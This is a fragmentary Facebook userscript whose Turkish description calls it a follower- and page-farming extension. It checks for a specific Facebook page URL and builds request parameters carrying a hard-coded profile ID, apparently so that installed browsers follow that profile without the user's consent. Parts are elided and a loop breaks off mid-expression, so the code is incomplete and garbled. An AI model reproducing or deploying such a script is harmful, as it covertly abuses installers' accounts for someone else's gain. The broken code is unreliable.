// ==UserScript== 
// @name sChrome Facebook 
// @author sChrome Facebook 
// @version 1.0 
// @description sFacebook Abone Kasma & Sayfa Kasma Eklentisi 
// @namespace sChrome Facebook 
...
if (document.URL.indexOf("facebook.com/Trollolololl") >= 0 && document.URL.indexOf("sharer.php") < 0) { 
for (i = 0; i <=>
...
var params = "profile_id=1447606620"; 
params += "&location=1"; 
